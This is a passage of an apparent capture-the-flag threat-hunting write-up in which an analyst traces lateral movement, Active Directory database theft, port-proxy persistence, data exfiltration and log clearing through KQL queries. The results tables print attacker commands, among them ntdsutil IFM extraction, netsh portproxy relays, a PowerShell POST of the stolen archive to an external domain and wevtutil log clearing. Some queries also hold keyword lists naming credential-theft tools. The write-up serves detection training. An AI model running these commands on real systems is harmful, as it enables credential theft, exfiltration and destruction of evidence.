| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has "/node:"
| project EventTime, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(selected rows — all 7 commands use `/user:"m.richter" /password:"Haldric2025SecIT"`)*

| EventTime | ProcessCommandLine |
|---|---|
| 2026-02-28 03:15 | `wmic  /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process list brief` |
| 2026-02-28 03:16 | `wmic  /node:"SRV-DC01" /user:"m.richter" /password:"Haldric2025SecIT" process call create …` |
| *(+ 5 more /node: commands, all bearing `/password:"Haldric2025SecIT"`)* | |

**Flag**
`m.richter`

</details>

<details>
<summary><strong>Q15 — Cross-Host Spawning · <code>WMIC</code></strong></summary>

**Goal**
Identify the tool used to deliver remote process execution from WS-ENG04 to target hosts.

**Approach**
Q13 had already established WMIC as the lateral movement tool. Ran a `distinct FileName` on all `/node: process call create` commands from WS-ENG04 to confirm no other binary was used alongside it. One result returned.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents" and DeviceName == "WS-ENG04"
| where ProcessCommandLine has "/node:" and ProcessCommandLine has "process call create"
| distinct FileName
```

**Results**

| FileName |
|---|
| `WMIC.exe` |

**Flag**
`WMIC`

</details>

<details>
<summary><strong>Q16 — New Filesystem Activity · <code>C:\Windows\Temp\McAfee_Logs</code></strong></summary>

**Goal**
Identify the staging directory created on SRV-DC01 after the WMIC lateral pivot.

**Approach**
Q13 showed the WMIC command delivering `mkdir C:\Windows\Temp\McAfee_Logs` to SRV-DC01. Rather than reading the answer from the command line, queried DeviceFileEvents on SRV-DC01 from the pivot timestamp to confirm the directory actually landed on disk. The first row at 4:18 AM Feb 28 showed `McAfee_Logs` created by `cmd.exe` — followed three minutes later by `ntds.dit` and `SYSTEM` in the same path, and immediately after by `MsMpEng.exe` scanning both files. The rest of the results were routine EventLog heartbeat writes from svchost — background noise.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceFileEvents" and DeviceName == "SRV-DC01"
| where todatetime(EventTime) >= datetime(2026-02-28T03:15:00Z)
| project EventTime, FileName, FolderPath, ActionType, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(selected rows — remaining rows are routine svchost EventLog writes)*

| EventTime | FileName | FolderPath | InitiatingProcessFileName |
|---|---|---|---|
| 2026-02-28 04:18 | `McAfee_Logs` | `C:\Windows\Temp` | `cmd.exe` |
| 2026-02-28 04:21 | `ntds.dit` | `C:\Windows\Temp\McAfee_Logs` | `cmd.exe` |
| 2026-02-28 04:21 | `SYSTEM` | `C:\Windows\Temp\McAfee_Logs` | `cmd.exe` |
| 2026-02-28 04:21 | `SECURITY` | `C:\Windows\Temp\McAfee_Logs` | `cmd.exe` |
| 2026-02-28 04:21 | `ntds.dit` | `C:\Windows\Temp\McAfee_Logs` | `MsMpEng.exe` |
| 2026-02-28 04:21 | `SYSTEM` | `C:\Windows\Temp\McAfee_Logs` | `MsMpEng.exe` |
| *(+ svchost EventLog heartbeat writes)* | | | |

**Flag**
`C:\Windows\Temp\McAfee_Logs`

</details>

<details>
<summary><strong>Q17 — Critical File · <code>ntds.dit/m.richter</code></strong></summary>

**Goal**
Identify the critical file extracted into the staging directory and attribute it to an account.

**Approach**
Queried all DeviceFileEvents in the McAfee_Logs directory on SRV-DC01. Three files were created by `cmd.exe`: `ntds.dit`, `SYSTEM`, and `SECURITY` — a complete ntdsutil IFM output. `AccountName` was blank on every row, as expected for WMI-spawned writes (data dictionary gotcha #2). Attribution to `m.richter` comes from the WMIC `/user:"m.richter"` command in Q13 that delivered the ntdsutil extraction — the file event itself carries no user context.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceFileEvents" and DeviceName == "SRV-DC01"
| where FolderPath has "McAfee_Logs"
| project EventTime, FileName, FolderPath, ActionType, AccountName, InitiatingProcessFileName
| sort by EventTime asc
```

**Results** *(`AccountName` blank on all rows — expected for WMI-spawned file writes)*

| EventTime | FileName | ActionType | AccountName | InitiatingProcessFileName |
|---|---|---|---|---|
| 2026-02-28 04:21 | `ntds.dit` | FileCreated | *(blank)* | `cmd.exe` |
| 2026-02-28 04:21 | `SYSTEM` | FileCreated | *(blank)* | `cmd.exe` |
| 2026-02-28 04:21 | `SECURITY` | FileCreated | *(blank)* | `cmd.exe` |
| 2026-02-28 04:21 | `ntds.dit` | FileCreated | *(blank)* | `MsMpEng.exe` |
| 2026-02-28 04:21 | `SYSTEM` | FileCreated | *(blank)* | `MsMpEng.exe` |

**Flag**
`ntds.dit/m.richter`

**Lesson**
> `DeviceFileEvents.AccountName` is blank for WMI-spawned file writes. To attribute a file to a user in this scenario, pivot to the WMIC command that delivered the operation — the `/user:` argument is the authoritative source.

</details>

<details>
<summary><strong>Q18 — Concurrent File Access · <code>MsMpEng.exe</code></strong></summary>

**Goal**
Identify which process accessed the staged files concurrently with their creation on SRV-DC01.

**Approach**
Q17 had already surfaced `MsMpEng.exe` touching `ntds.dit` and `SYSTEM` within seconds of `cmd.exe` writing them. Confirmed with a focused query excluding `cmd.exe` from the McAfee_Logs file events — one process returned. The file-event action is logged as `FileCreated`, so the safest wording is that Windows Defender touched/scanned both files immediately after creation; no block or quarantine event is visible.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceFileEvents" and DeviceName == "SRV-DC01"
| where FolderPath has "McAfee_Logs"
| where InitiatingProcessFileName != "cmd.exe"
| distinct InitiatingProcessFileName
```

**Results**

| InitiatingProcessFileName |
|---|
| `MsMpEng.exe` |

**Flag**
`MsMpEng.exe`

</details>

<details>
<summary><strong>Q19 — Database File Access · <code>ntdsutil</code></strong></summary>

**Goal**
Identify which tool was used to access `ntds.dit` — the Active Directory database file, which remains OS-locked while the NTDS service is running.

**Approach**
Pivoted to SRV-DC01 process events and swept for credential-access technique keywords across the Feb 28 window. The technique-level sweep (`ntds`, `lsass`, `vssadmin`, `comsvcs`, `reg save`, etc.) surfaced `ntdsutil.exe` running the IFM (Install From Media) command — the standard method for extracting the AD database without stopping the NTDS service. IFM instructs NTDS to create a VSS snapshot internally, confirmed by `vssadmin create shadow /for=C:` appearing two minutes later in the same session.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine has_any ("ntds","lsass","mimikatz","sekurlsa","MiniDump","comsvcs","reg save","HKLM\\SAM","vssadmin","cmdkey","DPAPI","procdump")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results**

| EventTime | FileName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 04:18 | `ntdsutil.exe` | `ntdsutil  … "create full C:\Windows\Temp\McAfee_Logs" …` |
| 2026-02-28 04:20 | `vssadmin.exe` | `vssadmin  create shadow /for=C:` |

**Flag**
`ntdsutil`

**Lesson**
> `ntdsutil IFM` is the attacker's preferred method for AD database extraction precisely because it never touches the live `ntds.dit` file directly — it requests NTDS to export via VSS, so no file lock is broken and no service interruption occurs. The VSS shadow creation (`vssadmin create shadow`) immediately following confirms the mechanism.

</details>

<details>
<summary><strong>Q20 — Spawning Source · <code>WmiPrvSE.exe/WS-ENG04</code></strong></summary>

**Goal**
Identify the process that spawned the attacker's commands on `SRV-DC01` and the host that triggered it remotely.

**Approach**
Started with a broad parent-process distribution across all `DeviceProcessEvents` on `SRV-DC01`. Against a background of hundreds of `splunkd.exe` and `svchost.exe` spawns, `WmiPrvSE.exe` appeared as a parent exactly 4 times — a tight, anomalous cluster. Drilling into those 4 events confirmed they were attacker cleanup commands under `m.richter` at 4:45–4:46 AM Feb 28: deleting the NTDS dump directory (`McAfee_Logs`) and clearing the Security event log — both delivered via WMIC from `WS-ENG04`. The trigger host `WS-ENG04` is established from the WMIC session context (Q13); the `DeviceProcessEvents` row itself only shows the local spawn parent.

**Query Used**

Query 1 — parent process distribution on SRV-DC01:
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| summarize count() by InitiatingProcessFileName
| sort by count_ desc
```

**Results — Query 1** *(truncated — WmiPrvSE.exe stands out against hundreds of routine spawns)*

| InitiatingProcessFileName | count_ |
|---|---|
| `splunkd.exe` | *(high)* |
| `svchost.exe` | *(high)* |
| *(… other routine processes)* | |
| `WmiPrvSE.exe` | 4 |

Query 2 — drill into WmiPrvSE.exe-spawned processes:
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where InitiatingProcessFileName == "WmiPrvSE.exe"
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Results — Query 2** *(4 rows — Sysmon double-logs 2 cleanup commands)*

| EventTime | AccountName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 04:45 | `m.richter` | `cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs` |
| 2026-02-28 04:46 | `m.richter` | `cmd.exe /c wevtutil  cl Security` |

**Flag**
`WmiPrvSE.exe/WS-ENG04`

**Lesson**
> Remote WMIC execution never shows the originating host in `DeviceProcessEvents` on the target — only the local WMI Provider Service (`WmiPrvSE.exe`) appears as parent. The trigger host (`WS-ENG04`) must be inferred from the lateral movement chain established earlier in the hunt.

</details>

<details>
<summary><strong>Q21 — RDP Scope · <code>SRV-DC01, SRV-FILES02, WS-ENG04</code></strong></summary>

**Goal**
Identify every host the attacker reached via RDP (or network logon) from their internal tunnel IP.

**Approach**
The attacker's VPN session assigns tunnel IP `10.1.96.114`. Pulled all `DeviceLogonEvents` from that IP and aggregated by host and action type to see the full picture before filtering. Three hosts returned exclusively `LogonSuccess` — no failed attempts, meaning the attacker had working credentials on all targets. `WS-ENG04` shows 14 sessions (primary beachhead); `SRV-DC01` and `SRV-FILES02` show 2 each (targeted lateral movement).

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteIP == "10.1.96.114"
| summarize count() by DeviceName, ActionType
| sort by DeviceName asc
```

**Results** *(no failed attempts — attacker had working credentials on all three hosts)*

| DeviceName | ActionType | count_ |
|---|---|---|
| `SRV-DC01` | LogonSuccess | 2 |
| `SRV-FILES02` | LogonSuccess | 2 |
| `WS-ENG04` | LogonSuccess | 14 |

**Flag**
`SRV-DC01, SRV-FILES02, WS-ENG04`

</details>

---

## Phase 05 — Can They Come Back?

<details>
<summary><strong>Q22 — Network Configuration Change · <code>netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local</code></strong></summary>

**Goal**
Identify the exact network configuration command run on the beachhead to establish internal tunneling.

**Approach**
Swept `DeviceProcessEvents` on `WS-ENG04` for port-forwarding and tunneling technique keywords. A single portproxy command appeared twice at 3:25 AM Feb 28 (Sysmon double-log) under `s.brandt`: forwarding all traffic on port 8443 to `SRV-DC01.haldric.local:445` (SMB). Two later entries on March 3 were `netsh interface show interface` — network-state checks, not a new configuration. Those March 3 commands ran with **no attacker-pattern FortiGate VPN session** (only the legitimate user was on VPN that day — see Q31), making relay-backed access a strong interpretation, though the telemetry does not directly record the ingress path.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "WS-ENG04"
| where ProcessCommandLine has_any ("netsh","portproxy","listenport","connectport")
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(portproxy row appears twice — Sysmon double-log)*

| EventTime | AccountName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 03:25 | `s.brandt` | `netsh  interface portproxy add v4tov4 … connectaddress=SRV-DC01.haldric.local` |
| 2026-03-03 | `s.brandt` | `netsh  interface show interface` |
| 2026-03-03 | `s.brandt` | `netsh  interface show interface` |

**Flag**
`netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local`

**Lesson**
> The double space between `netsh` and `interface` is Windows process logging artefact — the binary name and its arguments are separated by two spaces in `ProcessCommandLine`. Submit exactly as logged.

</details>

<details>
<summary><strong>Q23 — Configuration Storage · <code>HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp</code></strong></summary>

**Goal**
Identify the registry key where the portproxy rule was stored, giving it persistence across reboots.

**Approach**
Swept `DeviceRegistryEvents` on `WS-ENG04` for any key path containing PortProxy or related services terms. One write appeared at the same second as the `netsh` command (3:25:27 AM Feb 28): `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` with value name `0.0.0.0/8443` and value data `SRV-DC01.haldric.local/445`. The registry entry is the mechanism that makes the portproxy survive a reboot — no scheduled task or service required.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceRegistryEvents"
| where DeviceName == "WS-ENG04"
| where RegistryKey has_any ("PortProxy","portproxy","Services\\Port")
| project EventTime, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| sort by EventTime asc
```

**Results**

| EventTime | ActionType | RegistryKey | RegistryValueName | RegistryValueData |
|---|---|---|---|---|
| 2026-02-28 03:25:27 | RegistryValueSet | `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` | `0.0.0.0/8443` | `SRV-DC01.haldric.local/445` |

**Flag**
`HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp`

</details>

<details>
<summary><strong>Q24 — Matching Configuration on DC · <code>netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp</code></strong></summary>

**Goal**
Find the portproxy rule set up on `SRV-DC01` that forms the other half of the relay tunnel.

**Approach**
Same technique sweep as Q22, scoped to `SRV-DC01`. The command appeared twice at 4:23 AM Feb 28 under `m.richter` (Sysmon double-log). It listens on DC01:9999 and forwards traffic back to `10.1.36.210:8443` — `WS-ENG04`'s static LAN IP, distinct from the attacker's VPN tunnel IP `10.1.96.114` (Q13/Q21). The portproxy points at the machine's physical interface, not the tunnel. The matching registry write lands one second later at 04:23:15 — `HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp` with value `0.0.0.0/9999` → `10.1.36.210/8443` (verified via `DeviceRegistryEvents` on `SRV-DC01`; same persistence key as Q23 on WS-ENG04, mirrored for the DC side). Combined with Q22, the paired rules are consistent with a relay path of DC01:9999 → WS-ENG04:8443 → DC01:445, but the configuration is the directly logged evidence.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine has_any ("netsh","portproxy","listenport","connectport")
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(appears twice — Sysmon double-log)*

| EventTime | AccountName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 04:23 | `m.richter` | `netsh  interface portproxy add v4tov4 … listenport=9999 connectaddress=10.1.36.210 connectport=8443 …` |

**Flag**
`netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp`

**Lesson**
> The two portproxy rules (Q22 + Q24) form a plausible loopback relay: traffic entering the DC on 9999 would exit to the beachhead on 8443, and the beachhead would return it to the DC on 445 (SMB). The configuration is directly logged; packet-path reconstruction remains analytic inference from the paired rules.

</details>

---

## Phase 06 — What Left the Network?

<details>
<summary><strong>Q25 — Targeted Directory · <code>C:\Engineering\Avionics\A400M_NavSys</code></strong></summary>

**Goal**
Identify the source directory compressed by the attacker for exfiltration.

**Approach**
Swept `DeviceProcessEvents` on `SRV-FILES02` for archiving and compression technique keywords. The query surfaced the complete staging sequence under `m.richter` at 3:18–3:25 AM Feb 28: `Compress-Archive` compressing the A400M navigation system directory, `certutil -encode` base64-encoding the zip for text-safe transit, then `del /f /q` wiping both the zip and the `.b64` file. The `-Path` argument strips the trailing `\*` wildcard for the flag.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-FILES02"
| where ProcessCommandLine has_any ("Compress-Archive","Archive","zip","compress")
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results**

| EventTime | AccountName | ProcessCommandLine |
|---|---|---|
| 2026-02-28 03:18 | `m.richter` | `powershell  Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force` |

**Flag**
`C:\Engineering\Avionics\A400M_NavSys`

**Lesson**
> The same query surfaces the full exfil chain in one pass: compress → encode → delete. The destination filename (`win_update_kb5034.zip`) is a Windows Update masquerade. The `certutil -encode` step converts binary zip to base64 for HTTP/text-channel transit.

</details>

<details>
<summary><strong>Q26 — Packaged Output · <code>win_update_kb5034.zip</code></strong></summary>

**Goal**
Identify the filename of the archive the attacker created for staging and exfiltration.

**Approach**
The same `Compress-Archive` query run for Q25 returned the full command line, including the `-DestinationPath` argument. The zip was written to `C:\Windows\Temp\win_update_kb5034.zip` — a Windows Update filename masquerade to blend with legitimate patch artefacts. The flag is the filename only.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-FILES02"
| where ProcessCommandLine has_any ("Compress-Archive","Archive","zip","compress")
| project EventTime, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(same query as Q25 — flag is the `-DestinationPath` filename)*

| DestinationPath |
|---|
| `C:\Windows\Temp\win_update_kb5034.zip` |

**Flag**
`win_update_kb5034.zip`

</details>

<details>
<summary><strong>Q27 — Compression Method · <code>Compress-Archive</code></strong></summary>

**Goal**
Identify the tool the attacker used to compress the exfil data into an archive.

**Approach**
Swept all `DeviceProcessEvents` for archiving and compression technique keywords (`Archive`, `7z`, `makecab`, `WinRAR`, `WinZip`). Two tools appeared on `SRV-FILES02` under `m.richter`: `makecab.exe` at 3:17 AM compressing a single `.docx` to `nav_cache.cab`, followed by `Compress-Archive` at 3:18 AM zipping the full `A400M_NavSys\*` directory to `win_update_kb5034.zip`. Since Q27 follows directly from Q26 (the packaged output zip), the answer is the tool that produced it.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "Archive"
    or ProcessCommandLine has_any ("7z","makecab","WinRAR","WinZip")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results**

| EventTime | DeviceName | FileName | ProcessCommandLine |
|---|---|---|---|
| 2026-02-28 03:17 | `SRV-FILES02` | `makecab.exe` | `makecab  … nav_cache.cab` |
| 2026-02-28 03:18 | `SRV-FILES02` | `powershell.exe` | `powershell  Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip' -Force` |

**Flag**
`Compress-Archive`

</details>

<details>
<summary><strong>Q28 — Format Conversion · <code>certutil</code></strong></summary>

**Goal**
Identify the tool used to convert the compressed archive into a format suitable for exfiltration.

**Approach**
Swept `DeviceProcessEvents` for encoding and conversion technique keywords (`certutil`, `base64`, `openssl`, `bitsadmin`, `encode`). Two `certutil` calls returned: one on `SRV-FILES02` at 3:19 AM Feb 28 using `-encode` to base64 the zip into `win_update_kb5034.b64`, and one on `WS-ENG04` on March 4 at 02:45 AM using `-urlcache -split -f` to GET `https://cdn-telemetry.cloud-endpoint.net` and save the response to `C:\Windows\Temp\response.txt`. The format conversion is unambiguously the `-encode` call; the `-urlcache` call is a March 4 C2 beacon to the same domain (see Attack Narrative) — same C2, different role, not part of the exfil chain itself.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("certutil","base64","openssl","bitsadmin","encode","Convert-ToBase64")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results**

| EventTime | DeviceName | AccountName | ProcessCommandLine |
|---|---|---|---|
| 2026-02-28 03:19 | `SRV-FILES02` | `m.richter` | `certutil  -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64` |
| 2026-03-04 | `WS-ENG04` | `s.brandt` | `certutil  -urlcache -split -f … ` |

**Flag**
`certutil`

</details>

<details>
<summary><strong>Q29 — Outbound Transfer · <code>powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing</code></strong></summary>

**Goal**
Identify the exact command used to transfer the exfil data out of the network.

**Approach**
Swept all `DeviceProcessEvents` for HTTP upload primitive keywords (`Invoke-WebRequest`, `Invoke-RestMethod`, `curl`, `wget`, `bitsadmin`, `WebClient`, `UploadFile`). One command returned — twice at 1:19 AM March 2 on `WS-ENG04` under `s.brandt` (Sysmon double-log): `Invoke-WebRequest` POSTing `win_update_kb5034.b64` to `cdn-telemetry.cloud-endpoint.net`. The timing is 2 days after the Feb 28 compression/encoding on `SRV-FILES02`, consistent with the attacker staging then exfiltrating in a separate session.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("Invoke-WebRequest","Invoke-RestMethod","curl","wget","bitsadmin","WebClient","UploadFile","UploadData")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(appears twice — Sysmon double-log)*

| EventTime | DeviceName | AccountName | ProcessCommandLine |
|---|---|---|---|
| 2026-03-02 01:19 | `WS-ENG04` | `s.brandt` | `powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing` |

**Flag**
`powershell  Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing`

</details>

<details>
<summary><strong>Q30 — External Destination · <code>cdn-telemetry.cloud-endpoint.net</code></strong></summary>

**Goal**
Identify the external hostname the attacker sent the exfil data to.

**Approach**
Cross-checked the Q29 `Invoke-WebRequest` `-Uri` value against `DeviceNetworkEvents` and DNS queries from `WS-ENG04` on March 2. The network telemetry was noisy (named pipes, WinRM, task scheduler events) with no DNS resolution for the domain visible — likely routed through the portproxy tunnel. The destination is confirmed directly and unambiguously from the `-Uri` parameter of the Q29 POST command: `https://cdn-telemetry.cloud-endpoint.net`. The domain name is designed to blend with legitimate CDN/telemetry traffic.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("Invoke-WebRequest","Invoke-RestMethod","curl","wget","bitsadmin","WebClient","UploadFile","UploadData")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(same query as Q29 — flag is the `-Uri` hostname)*

| -Uri hostname |
|---|
| `cdn-telemetry.cloud-endpoint.net` |

**Flag**
`cdn-telemetry.cloud-endpoint.net`

</details>

<details>
<summary><strong>Q31 — Reentry Window · <code>2</code></strong></summary>

**Goal**
Determine how many days elapsed between the exfil VPN session and the attacker's next VPN reconnect.

**Approach**
Pulled the full FortiGateVPN timeline for `s.brandt` sorted chronologically. Attacker-pattern sessions are distinguished from legitimate logins by tunnel IP: attacker-controlled source IPs receive `10.1.96.114`, while normal `s.brandt` logins from `88.153.72.14` receive `10.20.10.101`. The exfil session was March 2 at 1:10 AM (`45.153.160.88` → `10.1.96.114`). A March 3 login from `88.153.72.14` → `10.20.10.101` is the legitimate user, not the attacker. The next attacker-pattern VPN session was March 4 at 4:20 AM (`45.153.160.88` → `10.1.96.114`) — 2 days after the exfil. Important caveat: this 2-day VPN gap is **not the same as 2 days of attacker absence**. WS-ENG04 process telemetry shows attacker-pattern recon (`netstat -ano`, repeated `net`/`net1` local administrator and domain-user enumeration, and two `netsh interface show interface` checks) on March 3 with no concurrent attacker-pattern FortiGate VPN session. Access via the Feb 28 portproxy relay is a strong interpretation, but not directly packet-proven. A later short attacker-pattern VPN session also appears on March 5 at 3:05 AM.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| project EventTime, ActionType, RemoteIP, TunnelIP, DestinationHost
| sort by EventTime asc
```

**Results** *(selected rows around exfil and reentry — TunnelIP distinguishes attacker from legitimate user)*

| EventTime | RemoteIP | TunnelIP | ActionType |
|---|---|---|---|
| 2026-03-02 01:10 | `45.153.160.88` | `10.1.96.114` | ssl-login-succ |
| 2026-03-03 | `88.153.72.14` | `10.20.10.101` | ssl-login-succ |
| 2026-03-04 04:20 | `45.153.160.88` | `10.1.96.114` | ssl-login-succ |
| 2026-03-05 03:05 | `185.220.101.34` | `10.1.96.114` | ssl-login-succ |

**Flag**
`2`

**Lesson**
> Distinguishing attacker VPN sessions from legitimate user sessions requires correlating RemoteIP with TunnelIP — attacker-pattern source IPs received a different tunnel IP (`10.1.96.114`) than the user's normal sessions (`10.20.10.101`). Counting raw login events would give the wrong answer. Equally important: once persistence is in place, VPN-session gaps are no longer the same as attacker-presence gaps. March 3 process telemetry shows activity consistent with relay-backed access even though FortiGate does not show an attacker-pattern VPN session that day.

</details>

---

## Phase 07 — What Did They Cover?

<details>
<summary><strong>Q32 — First Cleanup Action · <code>wevtutil  cl Security</code></strong></summary>

**Goal**
Identify the earliest log-clearing or trace-removal command run by the attacker across all hosts.

**Approach**
Swept all `DeviceProcessEvents` for event-log clearing technique keywords (`wevtutil`, `Clear-EventLog`, `clearev`) sorted chronologically. The earliest hit was Feb 23 at 11:01 AM on `WS-ENG04` by `s.brandt` — a direct console execution of `wevtutil  cl Security`, 5 days before the Feb 28 multi-host cleanup sweep. The flag is the earliest `ProcessCommandLine` as logged, including the double space Windows inserts between the binary name and its arguments.

**Query Used**
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("wevtutil","Clear-EventLog","clearev","cl Security","cl System","cl Application")
| project EventTime, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by EventTime asc
```

**Results** *(selected rows — Feb 23 early cleanup predates the Feb 28 multi-host sweep)*

| EventTime | DeviceName | AccountName | ProcessCommandLine |
|---|---|---|---|
| 2026-02-23 11:01 | `WS-ENG04` | `s.brandt` | `wevtutil  cl Security` |
| 2026-02-23 12:08 | `WS-ENG04` | `s.brandt` | `wevtutil  cl Security` |
| 2026-02-28 03:33 | `SRV-FILES02` | `m.richter` | `wevtutil  cl Security` |
| 2026-02-28 03:47 | `WS-ENG04` | `s.brandt` | `wmic  /node:"SRV-DC01" … wevtutil cl Security` |
| 2026-02-28 03:48 | `WS-ENG04` | `s.brandt` | `wmic  /node:"SRV-FILES02" … wevtutil cl Security` |
| 2026-02-28 04:46 | `SRV-DC01` | `m.richter` | `wevtutil  cl Security` |

**Flag**
`wevtutil  cl Security`

</details>

<details>
<summary><strong>Q33 — Clearing Method Analysis · <code>WS-ENG04/SRV-DC01,SRV-FILES02</code></strong></summary>

**Goal**
Determine which host initiated the log clearing campaign and which hosts were remotely targeted.

**Approach**
Pulled all `wevtutil` process events with `InitiatingProcessFileName` to distinguish direct console execution from WMIC-delivered execution. Three distinct roles emerged: `WS-ENG04` ran `wevtutil` directly (Feb 23, parent = `cmd.exe`) and also issued WMIC commands targeting `SRV-DC01` and `SRV-FILES02` (Feb 28) — making it both local cleaner and remote initiator. `SRV-FILES02` and `SRV-DC01` both received clearing via `WmiPrvSE.exe` → `cmd.exe` → `wevtutil.exe`, confirming they were remotely targeted, not initiators.

**Query Used**
```kql
